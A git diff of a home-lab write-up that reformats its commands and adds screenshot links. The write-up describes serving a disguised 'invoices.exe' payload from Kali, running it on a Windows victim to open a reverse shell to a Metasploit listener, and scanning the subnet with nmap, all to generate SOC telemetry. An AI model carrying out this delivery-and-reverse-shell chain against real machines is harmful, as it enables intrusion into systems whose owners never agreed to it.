@@ -17,11 +17,15 @@ This is where the lab starts reflecting real attacker behavior.
 ## Delivering the Payload to the Windows Victim
 With the HTTP server running on Kali:
 
-``python3 -m http.server 9999``
+```
+python3 -m http.server 9999
+```
 
 I browsed to the payload location from the Windows machine:
 
-``http://192.168.1.250:9999/invoices.exe``
+```
+http://192.168.1.250:9999/invoices.exe
+```
 
 Downloading or executing the payload triggered:
 
@@ -34,7 +38,9 @@ This is exactly the type of multi-source telemetry a SOC analyst investigates.
 
 ## Executing the Payload
 
-``.\invoices.exe``
+```
+.\invoices.exe
+```
 
 The payload initiated its reverse TCP callback back to Kali on port 4444.
 
@@ -49,11 +55,15 @@ This generated:
 
 Metasploit listener:
 
-``msfconsole -r scripts/msf_handler.rc``
+```
+msfconsole -r scripts/msf_handler.rc
+```
 
 Captured the callback, resulting in:
 
-``[*] Meterpreter session 1 opened``
+```
+[*] Meterpreter session 1 opened
+```
 
 From here, I could explore typical attacker behaviors such as:
 
@@ -67,13 +77,17 @@ Every action creates valuable logs for Splunk and the SOC workflow.
 
 Screenshots of session output can be stored in:
 
-``attack-simulation/screenshots/``
+```
+attack-simulation/screenshots/
+```
 
 ## Network Scanning with Nmap
 
 To create additional telemetry, I performed an Nmap scan from Kali:
 
-``nmap -A 192.168.1.0/24``
+```
+nmap -A 192.168.1.0/24
+```
 
 These scans simulate common attacker reconnaissance techniques (MITRE ATT&CK T1046).
 
@@ -94,6 +108,44 @@ Running these attacks allowed me to:
 ✔ Build my confidence across the entire attack lifecycle
 
 This simulation is the foundation for the next section: running structured Atomic Red Team tests.
+
+# Appendix: : Visual Evidence For Attack Simulation and NMAP
+
+### Metasploit
+
+![meta-image](https://github.com/user-attachments/assets/5170ad62-bdd0-471c-8544-d9b735a17d48)
+
+![metasploit-image](https://github.com/user-attachments/assets/f03bb4de-ca16-45a4-bd69-a199583d0eb0)
+
+### NMAP Scan
+
+![nmap-scan](https://github.com/user-attachments/assets/be6c73d2-d6ec-42e7-8ca6-6404ea4efe8f)
+
+![nmap-scan1](https://github.com/user-attachments/assets/d2a7aef6-b26f-4dfb-9e8f-e01cdfd211c4)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
